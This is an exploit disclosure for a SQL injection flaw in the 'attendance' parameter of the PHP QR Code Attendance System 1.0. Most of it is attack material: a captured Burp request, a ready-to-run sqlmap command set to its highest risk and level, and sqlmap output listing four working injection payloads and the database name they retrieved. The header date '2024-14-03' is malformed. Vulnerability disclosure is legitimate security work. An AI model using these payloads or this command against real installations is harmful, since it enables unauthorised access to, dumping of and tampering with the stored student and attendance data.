# QR Code Attendance System - SQL Injection -2
+ **Exploit Title:** QR Code Attendance System - SQL Injection - 2 
+ **Date:** 2024-14-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17242/qr-code-attendance-system-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17242&title=QR+Code+Attendance+System+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
QR Code Attendance System  1.0 allows SQL Injection via the 'attendance' parameter in "http://localhost/qr-code-attendance-system/endpoint/delete-attendance.php?attendance=2". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/qr-code-attendance-system/index.php
+ Select any student and press the delete-attendance button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /qr-code-attendance-system/endpoint/delete-attendance.php?attendance=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
```

+ Use sqlmap to exploit. In sqlmap, use 'attendance' parameter to dump the database.
```
sqlmap -r r.txt -p attendance --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: attendance (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: attendance=2' RLIKE (SELECT (CASE WHEN (1274=1274) THEN 2 ELSE 0x28 END))-- NtYS

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: attendance=2' AND EXTRACTVALUE(1166,CONCAT(0x5c,0x7170786a71,(SELECT (ELT(1166=1166,1))),0x7170787871))-- czHx

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: attendance=2';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: attendance=2' AND (SELECT 7330 FROM (SELECT(SLEEP(5)))HjJP)-- Dlra
---
[19:19:26] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[19:19:26] [INFO] fetching current database
[19:19:26] [INFO] retrieved: 'qr_attendance_db'
current database: 'qr_attendance_db'
```
+ current database: `qr_attendance_db`

![Ekran görüntüsü 2024-03-14 022556](https://github.com/BurakSevben/CVEs/assets/117217689/c0c51301-073e-4285-8a63-9b17ab6ad066)
